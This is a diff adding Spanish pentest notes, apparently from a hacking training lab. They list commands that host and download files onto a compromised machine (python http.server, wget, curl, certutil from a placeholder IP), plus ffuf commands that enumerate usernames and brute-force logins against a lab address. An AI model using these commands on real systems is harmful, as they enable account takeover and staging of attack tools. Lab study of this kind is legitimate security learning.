@@ -1,3 +1,24 @@
+### Transferencia rápida de archivos en entornos de post-explotación
+
+Inicia un servidor HTTP en el puerto 8080 con Python 3.
+`python3 -m http.server 8080`
+
+Inicia un servidor HTTP en el puerto 8080 con Python 2.
+`python -m SimpleHTTPServer 8080`
+
+Descarga un archivo desde el servidor utilizando `wget`.
+`wget http://<IP>:8080/archivo.txt`
+
+Descarga un archivo desde el servidor utilizando `curl`.
+`curl http://<IP>:8080/archivo.txt -o archivo.txt`
+
+Descarga un archivo en sistemas Windows utilizando `certutil`.
+`certutil -urlcache -split -f http://<IP>:8080/archivo.txt archivo.txt`
+
+//////////
+
+Room: Authentication Bypass
+
 ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.201.242/customers/signup -mr "username already exists"
 
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.201.242/customers/login -fc 200
